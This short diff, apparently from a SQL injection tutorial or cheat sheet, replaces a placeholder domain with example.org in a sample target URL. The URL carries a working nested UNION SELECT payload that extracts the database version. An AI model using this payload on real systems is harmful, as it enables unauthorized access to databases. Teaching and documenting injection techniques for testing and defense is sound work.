@@ -466,7 +466,7 @@ This can be your payload for extracting the version of the database:
 So the target URL would be like this:
 
 ```text
-http://sub.domain.tld/search?query=abcd'+AND+1=2+UNION+SELECT+"+'AND 1=2+UNION+SELECT+@@version+--+-"+--+-
+http://example.org/search?query=abcd'+AND+1=2+UNION+SELECT+"+'AND 1=2+UNION+SELECT+@@version+--+-"+--+-
 ```
 
 Automation:  
